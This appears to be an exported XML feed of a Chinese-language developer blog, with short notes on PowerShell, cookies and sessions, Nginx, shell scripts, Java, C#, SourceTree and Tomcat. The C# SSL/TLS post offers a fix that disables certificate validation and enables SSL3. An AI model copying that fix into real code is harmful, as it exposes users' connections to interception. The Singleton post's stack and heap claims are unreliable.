<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用系統管理員開啟Windows PowerShell</span><br><span class="line">$ Set-ExecutionPolicy RemoteSigned</span><br><span class="line"></span><br><span class="line">執行原則變更</span><br><span class="line">執行原則有助於防範您不信任的指令碼。如果變更執行原則，可能會使您接觸到 about_Execution_Policies 說明主題 (網址為</span><br><span class="line">https:/go.microsoft.com/fwlink/?LinkID=135170) 中所述的安全性風險。您要變更執行原則嗎?</span><br><span class="line">[Y] 是(Y)  [A] 全部皆是(A)  [N] 否(N)  [L] 全部皆否(L)  [S] 暫停(S)  [?] 說明 (預設值為 <span class="string">&quot;N&quot;</span>):</span><br><span class="line"></span><br><span class="line">$ A</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>VisualStudioCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Session與Cookie差別</title>
    <url>/posts/654a378d/</url>
    <content><![CDATA[<h2 id="Session與Cookie差別"><a href="#Session與Cookie差別" class="headerlink" title="Session與Cookie差別"></a>Session與Cookie差別</h2><span id="more"></span>
<p>這篇介紹在瀏覽器的世界中，常用的Session和cookie。<br>HTTP本身是個無狀態(Stateless)的協定，可以在Client與Server兩端進行溝通，但是無法紀錄網路上的行為。<br>Cookie和Session因此誕生，用來解決無紀錄狀態的問題。</p>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><p>由Server送給使用者瀏覽器的一小塊資料(文檔)。<br>瀏覽器會儲存它並且在瀏覽器下一次發送要求的時候將它送回原本送來的伺服器。<br>基本上，它是用來區分兩個要求是來自同一個瀏覽器 — 以此去保持使用者的登入狀態。<br>例如，它提供了保存狀態資訊的功能，來幫助HTTP這個無法紀錄狀態的通訊協定。</p>
<p>Cookie 由瀏覽器處理，具有兩個特性：<br>特定網域：只針對原本的 網域(domain) 起作用。舉例: 在 *.gaagle.com 存入的 Cookie，不會出現在 *.not-gaagle.com<br>有生命期限: 到了所設定的生命期限之後會失效。向這個domain的server發送請求時，也會被一併帶進去該請求中。</p>
<p>缺點:Cookie中的所有數據在Client端就可以被修改，數據非常容易被偽造，那麼一些重要的數據就不能存放在Cookie。</p>
<h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><p>Session負責紀錄在server端上的使用者訊息，會在一個用戶完成身分認證後，存下所需的用戶資料，<br>接著產生一組對應的 ID，存入 Cookie 後傳回用戶端。 Session泛指有始有終的系列動作&#x2F;消息。</p>
<p>Client端的Request建一個Session的時候，Server會先檢查這個Client端的Request裡是否有包含了Session標識(Session id)，<br>如果已包含一個Session id，表示這個發起Request的Client端是已經存放過的id，Server就按照Session id，把這個Session找出來使用。<br>但如果Client端請求不包含Session id，，則表示他是新臉孔，那Server端就為此Client端創建一個Session，並生成一個Session id，並Response給Client端保存。</p>
<h2 id="結論"><a href="#結論" class="headerlink" title="結論:"></a>結論:</h2><p>Session：帳號登錄驗證過後，Server端所發的識別證<br>Cookie：是瀏覽器存放資料的地方，可以存放seesion之類的資料</p>
]]></content>
      <categories>
        <category>Browser</category>
      </categories>
      <tags>
        <tag>Cookie</tag>
        <tag>Session</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Set Nginx For WebSocket</title>
    <url>/posts/fc3b80da/</url>
    <content><![CDATA[<h3 id="How-to-Set-Nginx-For-WebSocket"><a href="#How-to-Set-Nginx-For-WebSocket" class="headerlink" title="How to Set Nginx For WebSocket"></a>How to Set Nginx For WebSocket</h3><span id="more"></span>
<p>這篇介紹How to Set Nginx For WebSocket。</p>
<h3 id="How-to-set"><a href="#How-to-set" class="headerlink" title="How to set"></a>How to set</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">接續上一篇</span><br><span class="line">在檔案domain.conf，增加以下設定:</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">	listen       80;</span><br><span class="line">	server_name  david.blog;</span><br><span class="line"></span><br><span class="line">	location / &#123;</span><br><span class="line">		proxy_pass http://10.10.10.1:7777;</span><br><span class="line">		//此篇新增參數</span><br><span class="line">		proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        proxy_set_header Connection <span class="string">&quot;upgrade&quot;</span>;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto <span class="variable">$scheme</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">參數說明:</span><br><span class="line">proxy_http_version HTTP1.1版本</span><br><span class="line">proxy_set_header 設定Header資訊</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Nginx</tag>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>ShellScript-rename</title>
    <url>/posts/10015494/</url>
    <content><![CDATA[<h3 id="ShellScript-rename"><a href="#ShellScript-rename" class="headerlink" title="ShellScript-rename"></a>ShellScript-rename</h3><span id="more"></span>
<p>這篇介紹ShellScript-rename。</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在 Linux 系統中，重新命名資料夾或檔案也可以透過同一個指令來達成，這個指令是 <span class="built_in">mv</span>。</span><br><span class="line"><span class="built_in">mv</span> 是 move 的縮寫，他除了移動檔案資料夾的功能外也可以同時重新命名。</span><br><span class="line"></span><br><span class="line">當一個目錄資料夾底下有很多有特定檔名的檔案需要改名，</span><br><span class="line">例如產生的檔案 IMG000001.jpg~IMG000999.jpg ...等檔案，</span><br><span class="line">rename 這個指令可以用來批次修改檔名共同的部分。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># rename $1 $2 $3</span></span><br><span class="line"><span class="variable">$1</span>: 要被取代的關鍵字</span><br><span class="line"><span class="variable">$2</span>: 新的關鍵字</span><br><span class="line"><span class="variable">$3</span>: 檔名符合這個規則的才取代</span><br><span class="line"></span><br><span class="line">$ 把 IMG001.jpg, IMG002.jpg… 換成 img001.jpg, img002.jpg… </span><br><span class="line">$ rename IMG img IMG*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把所有 .htm 檔案改成 .html</span></span><br><span class="line">$ rename .htm .html *.htm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把檔案 foo1, ..., foo9, foo10, ..., foo278.</span></span><br><span class="line"><span class="comment"># 改成 foo001, ..., foo009, foo010, ..., foo278.</span></span><br><span class="line">$ rename foo foo0 foo?</span><br><span class="line">$ rename foo foo0 foo??</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ShellScript</category>
      </categories>
      <tags>
        <tag>ShellScript</tag>
      </tags>
  </entry>
  <entry>
    <title>ShellScript-taranddeleteBatch</title>
    <url>/posts/c7e2cb18/</url>
    <content><![CDATA[<h3 id="ShellScript-tar-and-delete-Batch"><a href="#ShellScript-tar-and-delete-Batch" class="headerlink" title="ShellScript-tar and delete Batch"></a>ShellScript-tar and delete Batch</h3><span id="more"></span>
<p>這篇介紹ShellScript-tar and delete Batch。</p>
<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">date</span>=`<span class="built_in">date</span> <span class="string">&quot;+%Y-%m-%d&quot;</span>`</span><br><span class="line"><span class="comment">#tar file for name have &quot;_&quot;</span></span><br><span class="line"><span class="string">&quot;find /usr/local/tomcat/logs/ -name &quot;</span>_*.<span class="built_in">log</span><span class="string">&quot; -print0 |xargs -0 tar -czvf <span class="variable">$date</span>-testlog.tar.gz &#123;&#125; \;&quot;</span></span><br><span class="line">memo:找出logs底下_開頭的.<span class="built_in">log</span>檔案，將檔案s壓縮成2021-06-02-testlog.tar.gz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete file for name have &quot;_&quot;</span></span><br><span class="line"><span class="string">&quot;find /usr/local/tomcat/logs/ -name &quot;</span>_*.<span class="built_in">log</span><span class="string">&quot; -exec rm -f &#123;&#125; \; &quot;</span></span><br><span class="line">memo:找出logs底下_開頭的.<span class="built_in">log</span>檔案，將檔案s刪除掉</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ShellScript</category>
      </categories>
      <tags>
        <tag>ShellScript</tag>
      </tags>
  </entry>
  <entry>
    <title>Singleton Class與Static Class比較</title>
    <url>/posts/fa278b1a/</url>
    <content><![CDATA[<h3 id="Singleton-Class-與-Static-Class比較"><a href="#Singleton-Class-與-Static-Class比較" class="headerlink" title="Singleton Class 與 Static Class比較"></a>Singleton Class 與 Static Class比較</h3><span id="more"></span>
<p>因Heap少於Stack，優先選擇Singleton Class使用。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">	Singleton Class:</span><br><span class="line">1.	使用自己的Instance</span><br><span class="line">2.	具備物件導向特性				</span><br><span class="line">3.	Stack					</span><br><span class="line">4.	物件實體，可當作參數傳遞及複製</span><br><span class="line">5.	可記憶體回收	</span><br><span class="line">6.	有擴充或需實作介面</span><br><span class="line">	Static Class:</span><br><span class="line">1.	不需要產生Instance，可直接操作</span><br><span class="line">2.	不具備物件導向特性</span><br><span class="line">3.	Heap</span><br><span class="line">4.	不可當作參數傳遞及複製</span><br><span class="line">5.	不可記憶體回收</span><br><span class="line">6.	無法繼承與實作介面</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Singleton</tag>
        <tag>Static Class</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell Script判斷檔案或目錄是否存在</title>
    <url>/posts/8f5f1617/</url>
    <content><![CDATA[<h3 id="Shell-Script判斷檔案或目錄是否存在"><a href="#Shell-Script判斷檔案或目錄是否存在" class="headerlink" title="Shell Script判斷檔案或目錄是否存在"></a>Shell Script判斷檔案或目錄是否存在</h3><span id="more"></span>
<p>shell script 是利用 shell 的功能所寫的一個『程式 (program)』，這個程式是使用純文字檔，<br>將一些 shell 的語法與指令(含外部指令)寫在裡面， 搭配正規表示法、管線命令與資料流重導向等功能，<br>以達到我們所想要的處理目的。</p>
<h3 id="檢查檔案是否存在"><a href="#檢查檔案是否存在" class="headerlink" title="檢查檔案是否存在:"></a>檢查檔案是否存在:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;/path/dir/filename&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 檔案 /path/dir/filename 存在</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File /path/dir/filename exists.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 檔案 /pat/dir/filename 不存在</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;File /path/dir/filename does not exists.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="檢查目錄是否存在"><a href="#檢查目錄是否存在" class="headerlink" title="檢查目錄是否存在:"></a>檢查目錄是否存在:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -d <span class="string">&quot;/path/dir&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># 目錄 /path/dir 存在</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Directory /path/dir exists.&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment"># 目錄 /path/dir 不存在</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;Directory /path/dir does not exists.&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="如果檔案不存在-便用-touch-建立檔案"><a href="#如果檔案不存在-便用-touch-建立檔案" class="headerlink" title="如果檔案不存在, 便用 touch 建立檔案:"></a>如果檔案不存在, 便用 touch 建立檔案:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ ! -f /tmp/testfile.log ] &amp;&amp; <span class="built_in">touch</span> /tmp/testfile.log</span><br></pre></td></tr></table></figure>

<h3 id="如果目錄不存在-便用-mkdir-建立檔案"><a href="#如果目錄不存在-便用-mkdir-建立檔案" class="headerlink" title="如果目錄不存在, 便用 mkdir 建立檔案:"></a>如果目錄不存在, 便用 mkdir 建立檔案:</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ ! -d /tmp/mydir ] &amp;&amp; <span class="built_in">mkdir</span> -p /tmp/mydir</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ShellScript</category>
      </categories>
      <tags>
        <tag>Instruction</tag>
      </tags>
  </entry>
  <entry>
    <title>String Array GroupingBy</title>
    <url>/posts/45f4a7c4/</url>
    <content><![CDATA[<h3 id="Intro-String-Array-GroupingBy"><a href="#Intro-String-Array-GroupingBy" class="headerlink" title="Intro String Array GroupingBy"></a>Intro String Array GroupingBy</h3><span id="more"></span>
<p>這篇介紹String Array GroupingBy.</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將 String[] <span class="built_in">test</span> = new String[]&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>&#125;;</span><br><span class="line">拆成兩個 String[] =&gt; [a, b, c] [d, e, f] 的作法:</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line"></span><br><span class="line">Arrays.stream(<span class="built_in">test</span>).collect(Collectors.groupingBy(it -&gt; counter.getAndIncrement() / 3))</span><br><span class="line">	.forEach((k, v) -&gt; &#123;</span><br><span class="line">		System.out.println(Arrays.toString(v.toArray()));</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">[a, b, c] </span><br><span class="line">[d, e, f]</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java8</category>
      </categories>
      <tags>
        <tag>Array</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>StaticClass與Non-StaticClass差異</title>
    <url>/posts/3833f89d/</url>
    <content><![CDATA[<h2 id="Difference-between-static-and-non-static-class"><a href="#Difference-between-static-and-non-static-class" class="headerlink" title="Difference between static and non-static class"></a>Difference between static and non-static class</h2><span id="more"></span>

<h2 id="STATIC-CLASS"><a href="#STATIC-CLASS" class="headerlink" title="STATIC CLASS:"></a>STATIC CLASS:</h2><p>Static class is defined using static keyword.	<br>In static class, you are not allowed to create objects.	<br>The data members of static class can be directly accessed by its class name.	<br>Static class always contains static members.	<br>Static class does not contain an instance constructor.	<br>Static class cannot inherit from another class.	</p>
<h2 id="NON-STATIC-CLASS"><a href="#NON-STATIC-CLASS" class="headerlink" title="NON-STATIC CLASS:"></a>NON-STATIC CLASS:</h2><p>Non-Static class is not defined by using static keyword.<br>In non-static class, you are allowed to create objects using new keyword.<br>The data members of non-static class is not directly accessed by its class name.<br>Non-static class may contain both static and non-static methods.<br>Non-static class contains an instance constructor.<br>Non-static class can be inherited from another class.</p>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Static</tag>
        <tag>Non-Static</tag>
      </tags>
  </entry>
  <entry>
    <title>SourceTree Personal Access Token</title>
    <url>/posts/982f8691/</url>
    <content><![CDATA[<h3 id="SourceTree-Personal-Access-Token"><a href="#SourceTree-Personal-Access-Token" class="headerlink" title="SourceTree Personal Access Token"></a>SourceTree Personal Access Token</h3><span id="more"></span>
<p>這篇介紹How to solve SourceTree use Personal Access Token。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">某一天要git push時，出現以下:</span><br><span class="line">Pushing to https://github.com/xxx/xxx.git</span><br><span class="line">remote: Support <span class="keyword">for</span> password authentication was removed on August 13, 2021.</span><br><span class="line">Please use a personal access token instead.</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">登入Github</span><br><span class="line">Settings -&gt; Developer settings -&gt; Personal access tokens</span><br><span class="line">申請完會給一組只能看一次的token替代password。</span><br><span class="line"></span><br><span class="line">SourceTree因有原本的帳號密碼認證紀錄</span><br><span class="line">需去</span><br><span class="line">%LocalAppData%\Atlassian\SourceTree\userhost</span><br><span class="line">%LocalAppData%\Atlassian\SourceTree\passwd</span><br><span class="line">將兩個檔案移除，重啟SourceTree</span><br><span class="line">做任何一個remote操作會需要輸入帳號和密碼</span><br><span class="line">這邊的密碼請輸入剛取得的Personal access token</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SourceTree</category>
      </categories>
      <tags>
        <tag>SourceTree</tag>
      </tags>
  </entry>
  <entry>
    <title>Struct vs. Class</title>
    <url>/posts/a05a0677/</url>
    <content><![CDATA[<h3 id="Struct-vs-Class"><a href="#Struct-vs-Class" class="headerlink" title="Struct vs. Class"></a>Struct vs. Class</h3><span id="more"></span>
<p>這篇介紹Struct和Class兩者資料結構的特性以及使用時機。</p>
<h3 id="兩者比較"><a href="#兩者比較" class="headerlink" title="兩者比較"></a>兩者比較</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Class				Struct</span><br><span class="line">Reference <span class="built_in">type</span>			value <span class="built_in">type</span></span><br><span class="line">可繼承				不可繼承</span><br><span class="line">可變更				不可變更</span><br><span class="line">				不能有預設建構子</span><br></pre></td></tr></table></figure>

<h3 id="使用時機"><a href="#使用時機" class="headerlink" title="使用時機"></a>使用時機</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當下列4個條件完全符合時，才建議使用Struct資料結構。</span><br><span class="line">沒有完全符合條件時，建議使用Class資料結構。</span><br><span class="line">defining a struct unless the <span class="built_in">type</span> has all of the following characteristics:</span><br><span class="line"></span><br><span class="line">1.It logically represents a single value, similar to primitive types (int, double, &gt; &gt; etc.).</span><br><span class="line">2.It has an instance size under 16 bytes.</span><br><span class="line">3.It is immutable.</span><br><span class="line">4.It will not have to be boxed frequently.</span><br><span class="line">In all other cases, you should define your types as classes.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Struct</tag>
        <tag>Class</tag>
      </tags>
  </entry>
  <entry>
    <title>SourceTree Use Many Github Accounts On Projects</title>
    <url>/posts/1ee6d3a6/</url>
    <content><![CDATA[<h3 id="SourceTree-Use-Many-Github-Accounts-On-Projects"><a href="#SourceTree-Use-Many-Github-Accounts-On-Projects" class="headerlink" title="SourceTree Use Many Github Accounts On Projects"></a>SourceTree Use Many Github Accounts On Projects</h3><span id="more"></span>
<p>這篇介紹SourceTree Use Many Github Accounts On Projects。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在SourceTree上擁有多個專案，且不同專案間使用不同的Github帳號。</span><br><span class="line">只要執行過</span><br><span class="line">$ git config --global user.name <span class="string">&quot;user.name&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;user.email&quot;</span></span><br><span class="line">則在這些專案中都會default以上的user.name和user.email</span><br><span class="line">在進行每個git指令時，就會用這個設定的帳號操作紀錄。</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在個別專案內執行</span><br><span class="line">$ git config --<span class="built_in">local</span> user.name <span class="string">&quot;user.name&quot;</span></span><br><span class="line">$ git config --<span class="built_in">local</span> user.email <span class="string">&quot;user.email&quot;</span></span><br><span class="line">建立自己專案使用的user.name和user.email</span><br><span class="line">該專案使用的預設帳號就會切換</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SourceTree</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>SourceTree</tag>
      </tags>
  </entry>
  <entry>
    <title>String Compare StringBuilder</title>
    <url>/posts/6b6c786d/</url>
    <content><![CDATA[<h3 id="Intro-String-Compare-StringBuilder"><a href="#Intro-String-Compare-StringBuilder" class="headerlink" title="Intro String Compare StringBuilder"></a>Intro String Compare StringBuilder</h3><span id="more"></span>
<p>這篇介紹String Compare StringBuilder.</p>
<h3 id="String優化"><a href="#String優化" class="headerlink" title="String優化"></a>String優化</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在JDK5對String進行優化，String相加優化成StringBuilder的append</span><br><span class="line"></span><br><span class="line">String a = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">String c = a + <span class="string">&quot;b&quot;</span>;</span><br><span class="line"></span><br><span class="line">優化成</span><br><span class="line"></span><br><span class="line">String c = new StringBuilder().append(a).append(<span class="string">&quot;b&quot;</span>).toString();</span><br><span class="line"></span><br><span class="line">在優化後，何時不能用String相加?</span><br><span class="line"></span><br><span class="line">String s = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt;= 100000000; i++) &#123;</span><br><span class="line">	s += String.valueOf(i);</span><br><span class="line">&#125; </span><br><span class="line">會等於</span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt;= 100000000; i++) &#123;</span><br><span class="line">	StringBuilder s = new StringBuilder().append(String.valueOf(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">實際上應使用</span><br><span class="line">StringBuilder s = new StringBuilder();</span><br><span class="line"><span class="keyword">for</span> (int i = 0; i &lt;= 100000000; i++) &#123;</span><br><span class="line">	s.append(String.valueOf(i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">兩者平均差距會在400多倍左右。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>String</tag>
        <tag>StringBuilder</tag>
      </tags>
  </entry>
  <entry>
    <title>System Net WebException 要求已經中止 無法建立SSL/TLS的安全通道</title>
    <url>/posts/c84944bf/</url>
    <content><![CDATA[<h3 id="System-Net-WebException-要求已經中止-無法建立SSL-x2F-TLS的安全通道"><a href="#System-Net-WebException-要求已經中止-無法建立SSL-x2F-TLS的安全通道" class="headerlink" title="System.Net.WebException:要求已經中止:無法建立SSL&#x2F;TLS的安全通道"></a>System.Net.WebException:要求已經中止:無法建立SSL&#x2F;TLS的安全通道</h3><span id="more"></span>
<p>這篇介紹在C#上執行Restful Api時會出現System.Net.WebException:要求已經中止:無法建立SSL&#x2F;TLS的安全通道<br>錯誤~該如何解決<br>SSL(Security Socket Layer)，在2014年，Google發現SSL存在安全漏洞，所以各大網站使用更安全的TLS。</p>
<h3 id="適用-NET版本為-NET-Framework-4-5以上"><a href="#適用-NET版本為-NET-Framework-4-5以上" class="headerlink" title="適用.NET版本為.NET Framework 4.5以上"></a>適用.NET版本為.NET Framework 4.5以上</h3><p>在request.GetResponse();之前加入以下設定:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate &#123; <span class="built_in">return</span> <span class="literal">true</span>; &#125;;</span><br><span class="line">System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12|SecurityProtocolType.Ssl3| SecurityProtocolType.Tls;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>RestfulApi</tag>
      </tags>
  </entry>
  <entry>
    <title>集合已修改; 列舉作業可能尚未執行。</title>
    <url>/posts/445377e0/</url>
    <content><![CDATA[<h3 id="System-InvalidOperationException-集合已修改-列舉作業可能尚未執行。"><a href="#System-InvalidOperationException-集合已修改-列舉作業可能尚未執行。" class="headerlink" title="System.InvalidOperationException: 集合已修改; 列舉作業可能尚未執行。"></a>System.InvalidOperationException: 集合已修改; 列舉作業可能尚未執行。</h3><span id="more"></span>
<p>這篇介紹System.InvalidOperationException: 集合已修改; 列舉作業可能尚未執行。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">foreach(var list <span class="keyword">in</span> lists) //當多執行緒或非同步同時對List操作時發生</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">foreach(var list <span class="keyword">in</span> lists.ToArray()) //將 List&lt;T&gt; 的項目複製到新的陣列。</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>List</tag>
      </tags>
  </entry>
  <entry>
    <title>Telegram Add GitLab Bot</title>
    <url>/posts/506b8399/</url>
    <content><![CDATA[<h3 id="Telegram-Add-GitLab-Bot"><a href="#Telegram-Add-GitLab-Bot" class="headerlink" title="Telegram Add GitLab Bot"></a>Telegram Add GitLab Bot</h3><span id="more"></span>
<p>如何將GitLab Bot 加入 Telegram，透過設定GitLab WebHook 達到通知呢~<br>有以下兩種實作方式:<br>1.自己實作 Telegram Bot，架Server起來，再設定 GitLab WebHook<br>2.使用 Telegram 官方提供的 GitLab Bot，再設定 GitLab WebHook</p>
<h3 id="用Telegram官方提供的GitLab-Bot"><a href="#用Telegram官方提供的GitLab-Bot" class="headerlink" title="用Telegram官方提供的GitLab Bot"></a>用Telegram官方提供的GitLab Bot</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">從 Telegram 搜尋 username @gitlab_bot ，依你的需要加入 channel 或是 group。</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/searchGitLabBotForTelegram.png" width="50%" />

<h3 id="加入GitLab-Bot的訊息"><a href="#加入GitLab-Bot的訊息" class="headerlink" title="加入GitLab Bot的訊息"></a>加入GitLab Bot的訊息</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">加入後 Bot 會自動提示你訊息：</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/addGitLabBotToGroup.png" width="50%" />

<h3 id="在GitLab-設定-WebHook"><a href="#在GitLab-設定-WebHook" class="headerlink" title="在GitLab 設定 WebHook"></a>在GitLab 設定 WebHook</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">接下來可以利用這個 WebHook URL 到 GitLab 做設定：Setting &gt; Integration &gt; WebHooks </span><br><span class="line">把需要通知的事件勾選，存檔並測試就可以囉</span><br></pre></td></tr></table></figure>
<img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/GitLabBotNotificationToGroup.PNG" width="50%" />]]></content>
      <categories>
        <category>Telegram</category>
      </categories>
      <tags>
        <tag>Telegram</tag>
        <tag>GitLab Bot</tag>
        <tag>WebHook</tag>
      </tags>
  </entry>
  <entry>
    <title>The Background Cache Eviction Process Was Unable To Free</title>
    <url>/posts/2601c064/</url>
    <content><![CDATA[<h3 id="The-Background-Cache-Eviction-Process-Was-Unable-To-Free"><a href="#The-Background-Cache-Eviction-Process-Was-Unable-To-Free" class="headerlink" title="The Background Cache Eviction Process Was Unable To Free"></a>The Background Cache Eviction Process Was Unable To Free</h3><span id="more"></span>
<p>這篇介紹關於The Background Cache Eviction Process Was Unable To Free。</p>
<h3 id="Tomcat-alert-Error"><a href="#Tomcat-alert-Error" class="headerlink" title="Tomcat alert Error"></a>Tomcat alert Error</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">10-Mar-2021 14:19:15.667 INFO [ContainerBackgroundProcessor[StandardEngine[Catalina]]] </span><br><span class="line">org.apache.catalina.webresources.Cache.backgroundProcess The background cache eviction process was unable to free [10] percent of the cache <span class="keyword">for</span> Context [] - </span><br><span class="line">consider increasing the maximum size of the cache. After eviction approximately [10,181] KB of data remained <span class="keyword">in</span> the cache.</span><br><span class="line"></span><br><span class="line">根據apache官方文件:</span><br><span class="line">The maximum size of the static resource cache <span class="keyword">in</span> kilobytes. If not specified, the default value is 10240 (10 megabytes).</span><br><span class="line">This value may be changed <span class="keyword">while</span> the web application is running (e.g. via JMX). </span><br><span class="line">If the cache is using more memory than the new <span class="built_in">limit</span> the cache will attempt to reduce <span class="keyword">in</span> size over time to meet the new <span class="built_in">limit</span>.</span><br><span class="line">If necessary, cacheObjectMaxSize will be reduced to ensure that it is no larger than cacheMaxSize/20. </span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /usr/local/tomcat/conf/context.xml</span><br><span class="line">加上 &lt;Resources cachingAllowed=<span class="string">&quot;true&quot;</span> cacheMaxSize=<span class="string">&quot;100000&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>]]></content>
